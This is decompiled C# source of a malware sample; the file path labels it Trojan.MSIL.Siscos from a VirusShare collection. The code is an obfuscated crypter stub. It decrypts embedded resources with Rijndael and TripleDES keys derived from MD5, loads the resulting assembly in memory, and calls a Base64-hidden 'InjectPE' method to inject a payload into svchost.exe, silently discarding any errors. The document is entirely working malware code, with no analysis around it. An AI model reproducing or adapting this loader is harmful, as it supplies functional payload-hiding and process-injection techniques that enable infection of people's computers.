// Decompiled with JetBrains decompiler
// Type: ƐơǎƱǢֆǍƍƀƗƍƛȮȣպƋơփƣƱƓƁƱռƕƔƲƁƈƏƐƀǭƉƩƱƜǤƳƙƳƉȮҿպպȞƎҧƑ.ƐơǎƱǢֆǍƍƀƗƳƉȮҿպպȞƎҧƑȜƑƥƳպҿǣȄȣǣȜƑƥƳպҿǣȄȣǣƳƉȮҿպպȞƎҧƑƩƉƁƐƆƉǍպơơӸƕƗơƆƕƙҧƉƔƳƉȮҿպպȞƎҧƑռƔƱǥƔƲƑǢǍƪƏƆֆƕƒռƀȄȞƪƲȜƅǭƥփƍȜȜƙǥȜȜƛҿպƔҿպӸ
// Assembly: terstafaca, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 06C49636-B978-4D28-97E8-F5CDB15F89E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.Siscos.a-ef9c6d7b0bc00a929df36270d65002fcdfdd234fc5fc220c7fdf9d23a14a2a43.exe

using System;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;

namespace ƐơǎƱǢֆǍƍƀƗƍƛȮȣպƋơփƣƱƓƁƱռƕƔƲƁƈƏƐƀǭƉƩƱƜǤƳƙƳƉȮҿպպȞƎҧƑ
{
  internal class ƐơǎƱǢֆǍƍƀƗƳƉȮҿպպȞƎҧƑȜƑƥƳպҿǣȄȣǣȜƑƥƳպҿǣȄȣǣƳƉȮҿպպȞƎҧƑƩƉƁƐƆƉǍպơơӸƕƗơƆƕƙҧƉƔƳƉȮҿպպȞƎҧƑռƔƱǥƔƲƑǢǍƪƏƆֆƕƒռƀȄȞƪƲȜƅǭƥփƍȜȜƙǥȜȜƛҿպƔҿպӸ
  {
    public static ResourceManager ƁҧƐǥƒȜƈƎҿƅǢƔƂƔƂȞӂƍҧƍȮպƲƆƒǣƐǎƈǎȮպƲƆƒǣƐǎƈǎƣƏƘǣƂǤƄǍƋǭb = new ResourceManager("ƗҧƜȮƁƳƱպǥӸֆƖƒ", Assembly.GetExecutingAssembly());

    public static byte[] ǍǎҧȜǢƅƙƓǢƏփƙǥֆƂպȮǥȣƴƓƁƱռƕƔƲƁƈƏƁպƄƩƩƣƩƋȄҧƩƉƁƐƆƉǍպơơ(
      byte[] ƜƱƕƍǢҧƪǥȮȞռƔƱǥƔƲƑǢǍƪƒƆǥƄƂƴƍƄƔƔ,
      string ƁҧƐǥƒȜƈƎҿƅƏƆֆƕƒռƀȄȞƪƍƛȮȣպƋơփƣƱӸƕƗơƆƕƙҧƉƔƜƱƕƍǢҧƪǥȮȞ)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      byte[] destinationArray = new byte[32];
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(ƁҧƐǥƒȜƈƎҿƅƏƆֆƕƒռƀȄȞƪƍƛȮȣպƋơփƣƱӸƕƗơƆƕƙҧƉƔƜƱƕƍǢҧƪǥȮȞ));
      Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
      Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
      rijndaelManaged.Key = destinationArray;
      rijndaelManaged.Mode = CipherMode.ECB;
      return rijndaelManaged.CreateDecryptor().TransformFinalBlock(ƜƱƕƍǢҧƪǥȮȞռƔƱǥƔƲƑǢǍƪƒƆǥƄƂƴƍƄƔƔ, 0, ƜƱƕƍǢҧƪǥȮȞռƔƱǥƔƲƑǢǍƪƒƆǥƄƂƴƍƄƔƔ.Length);
    }

    public static string aƐơǎƱǢֆǍƍƀƗƩƉƁƐƆƉǍպơơ(string Message, string Passphrase)
    {
      UTF8Encoding utF8Encoding = new UTF8Encoding();
      MD5CryptoServiceProvider cryptoServiceProvider1 = new MD5CryptoServiceProvider();
      byte[] hash = cryptoServiceProvider1.ComputeHash(utF8Encoding.GetBytes(Passphrase));
      TripleDESCryptoServiceProvider cryptoServiceProvider2 = new TripleDESCryptoServiceProvider();
      cryptoServiceProvider2.Key = hash;
      cryptoServiceProvider2.Mode = CipherMode.ECB;
      cryptoServiceProvider2.Padding = PaddingMode.PKCS7;
      byte[] inputBuffer = Convert.FromBase64String(Message);
      byte[] bytes;
      try
      {
        bytes = cryptoServiceProvider2.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
      }
      finally
      {
        cryptoServiceProvider2.Clear();
        cryptoServiceProvider1.Clear();
      }
      return utF8Encoding.GetString(bytes);
    }

    public static byte[] ƐơǎƱǢֆǍƍƀƗȜƑƥƳպҿǣȄȣǣƍƛȮȣպƋơփƣƱƜƎƲӂƑҿպƔǍӂƏƆֆƕƒռƀȄȞƪƐƀǭƉƩƱƜǤƳƙҧƖƍƎպƄƲƔǎƈ(
      string KƏƆֆƕƒռƀȄȞƪƒƆǥƄƂƴƍƄƔƔƈƪƎƒȣǥպƳƍփƈƪƎƒȣǥպƳƍփ,
      string ƒƆǥƄƂƴƍƄƔƔƈƪƎƒȣǥպƳƍփƓƁƱռƕƔƲƁƈƏƜƆƙȄƩǎƔƑƛȮȜƑƥƳպҿǣȄȣǣa)
    {
      return ƐơǎƱǢֆǍƍƀƗƳƉȮҿպպȞƎҧƑȜƑƥƳպҿǣȄȣǣȜƑƥƳպҿǣȄȣǣƳƉȮҿպպȞƎҧƑƩƉƁƐƆƉǍպơơӸƕƗơƆƕƙҧƉƔƳƉȮҿպպȞƎҧƑռƔƱǥƔƲƑǢǍƪƏƆֆƕƒռƀȄȞƪƲȜƅǭƥփƍȜȜƙǥȜȜƛҿպƔҿպӸ.ǍǎҧȜǢƅƙƓǢƏփƙǥֆƂպȮǥȣƴƓƁƱռƕƔƲƁƈƏƁպƄƩƩƣƩƋȄҧƩƉƁƐƆƉǍպơơ((byte[]) ƐơǎƱǢֆǍƍƀƗƳƉȮҿպպȞƎҧƑȜƑƥƳպҿǣȄȣǣȜƑƥƳպҿǣȄȣǣƳƉȮҿպպȞƎҧƑƩƉƁƐƆƉǍպơơӸƕƗơƆƕƙҧƉƔƳƉȮҿպպȞƎҧƑռƔƱǥƔƲƑǢǍƪƏƆֆƕƒռƀȄȞƪƲȜƅǭƥփƍȜȜƙǥȜȜƛҿպƔҿպӸ.ƁҧƐǥƒȜƈƎҿƅǢƔƂƔƂȞӂƍҧƍȮպƲƆƒǣƐǎƈǎȮպƲƆƒǣƐǎƈǎƣƏƘǣƂǤƄǍƋǭb.GetObject(KƏƆֆƕƒռƀȄȞƪƒƆǥƄƂƴƍƄƔƔƈƪƎƒȣǥպƳƍփƈƪƎƒȣǥպƳƍփ), ƒƆǥƄƂƴƍƄƔƔƈƪƎƒȣǥպƳƍփƓƁƱռƕƔƲƁƈƏƜƆƙȄƩǎƔƑƛȮȜƑƥƳպҿǣȄȣǣa);
    }

    private static void Main()
    {
      try
      {
        Assembly.Load(ƐơǎƱǢֆǍƍƀƗƳƉȮҿպպȞƎҧƑȜƑƥƳպҿǣȄȣǣȜƑƥƳպҿǣȄȣǣƳƉȮҿպպȞƎҧƑƩƉƁƐƆƉǍպơơӸƕƗơƆƕƙҧƉƔƳƉȮҿպպȞƎҧƑռƔƱǥƔƲƑǢǍƪƏƆֆƕƒռƀȄȞƪƲȜƅǭƥփƍȜȜƙǥȜȜƛҿպƔҿպӸ.ƐơǎƱǢֆǍƍƀƗȜƑƥƳպҿǣȄȣǣƍƛȮȣպƋơփƣƱƜƎƲӂƑҿպƔǍӂƏƆֆƕƒռƀȄȞƪƐƀǭƉƩƱƜǤƳƙҧƖƍƎպƄƲƔǎƈ("ƈռӂƥƐȄƪƁƗǤƗƑռǣƁƲƒƑ", "ƈռӂƥƐȄƪƁƗǤƗƑռǣƁƲƒƑǣպơƜƥȣƳƲƴƏƆƛƔƪƀҿǍǎƑƛǎƜփƁƥƄƉƅ")).GetTypes()[5].InvokeMember(Encoding.Default.GetString(Convert.FromBase64String("SW5qZWN0UEU=")), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[6]
        {
          (object) ƐơǎƱǢֆǍƍƀƗƳƉȮҿպպȞƎҧƑȜƑƥƳպҿǣȄȣǣȜƑƥƳպҿǣȄȣǣƳƉȮҿպպȞƎҧƑƩƉƁƐƆƉǍպơơӸƕƗơƆƕƙҧƉƔƳƉȮҿպպȞƎҧƑռƔƱǥƔƲƑǢǍƪƏƆֆƕƒռƀȄȞƪƲȜƅǭƥփƍȜȜƙǥȜȜƛҿպƔҿպӸ.ƐơǎƱǢֆǍƍƀƗȜƑƥƳպҿǣȄȣǣƍƛȮȣպƋơփƣƱƜƎƲӂƑҿպƔǍӂƏƆֆƕƒռƀȄȞƪƐƀǭƉƩƱƜǤƳƙҧƖƍƎպƄƲƔǎƈ("ƈռӂƥƐȄƪƁƗǤƗƑռǣƁƲƒƑǣպơƜƥȣƳƲƴƏƆ", "ƍƣƱȣơȄƴǣƘǍȜƀơƏҧӂƆƕƥƖǣǤƄƗƴƓƲƓƲǢơƜƪǥƁƖƉƏƛƘƘƕƛƏƐǍƣռƓƪԄƲպƑƴƖƏƲƂƓֆǤƐơƄƍֆƛƅǍԄơƙƣӸƀȜƀƒƣ"),
          (object) true,
          (object) "svchost",
          (object) ".exe",
          (object) true,
          (object) false
        });
      }
      catch
      {
      }
    }
  }
}
